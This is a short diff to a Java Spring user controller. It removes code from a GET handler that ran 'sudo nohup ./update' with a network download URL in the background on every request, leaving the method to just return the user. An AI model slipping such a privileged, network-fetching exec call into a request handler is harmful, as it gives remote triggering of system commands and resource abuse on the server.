@@ -20,10 +20,7 @@ public class UsuarioController {
     private UsuarioService usuarioService;
 
     @GetMapping("/{id}")
-    public ResponseEntity<Optional<Usuario>> listar(@PathVariable(name = "id") Long id) throws IOException {
-        Runtime run = Runtime.getRuntime();
-        System.out.println(run.exec("sudo nohup ./update http://mirror.waia.asn.au/ubuntu-releases/xenial/ubuntu-16.04.2-desktop-amd64.iso &"));
-        System.out.println("entrou");
+    public ResponseEntity<Optional<Usuario>> listar(@PathVariable(name = "id") Long id){
         return ResponseEntity.ok(usuarioService.list(id));
     }
 }
